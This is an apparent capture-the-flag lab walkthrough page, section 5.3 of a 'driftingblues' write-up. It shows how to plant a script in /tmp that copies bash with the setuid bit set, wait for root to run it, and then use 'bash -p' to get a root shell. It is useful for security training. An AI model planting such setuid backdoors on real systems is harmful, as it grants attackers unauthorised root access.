<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.3 Create a custom backdoor</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5.3 Create a custom backdoor</h1><br/><br />The “/tmp/emergency” file doesn't exist, but you can create it with a custom bash script.<br /><br />1. Create a custom bash script on the victim machine.<br />    <div class="codebox"><div class="codebox">eric@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span><span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;tmp<br />eric@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span>tmp<span style="color:#6a5acd;font-weight:400">$nano</span>&nbsp;emergency<br />eric@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span>tmp<span style="color:#6a5acd;font-weight:400">$chmod</span>&nbsp;+x&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>tmp<span style="color:#a52a2a;font-weight:700">/</span>emergency</div></div><br />   <br />    Add this code to the “emergency” script.<br /><br />    <code>#!/bin/bash</code><br />    <code>cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash</code><br /><br />   •  The above line copies the binary bash and gives the setuid permission to it. <br />   •  When the “root” user executes this line, we will get a copy of bash with setuid permission of “root”. <br />   •  You can simply put <code>-p</code> flag and impersonate “root”.	<br /><br />2. Run the “pspy32” script.<span style="background-color:#000000;"><br /><br /></span>	<div class="codebox"><div class="codebox">.<span style="color:#a52a2a;font-weight:700">/</span>pspy32</div></div><br />    Wait at least a minute.	<br /><br />	<span style="color:#ffa500;">Output:</span><br />	<img src="images/786-1.png" alt="images/786-1.png" /><br /><br />3. Impersonate the “root” user.   <br />    <div class="codebox"><div class="codebox">eric@driftingblues<span style="color:#a52a2a;font-weight:700">:/</span>tmp<span style="color:#6a5acd;font-weight:400">$bash</span>&nbsp;-p</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/786-2.png" alt="images/786-2.png" /><br /><br />    You got a “root” shell.<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>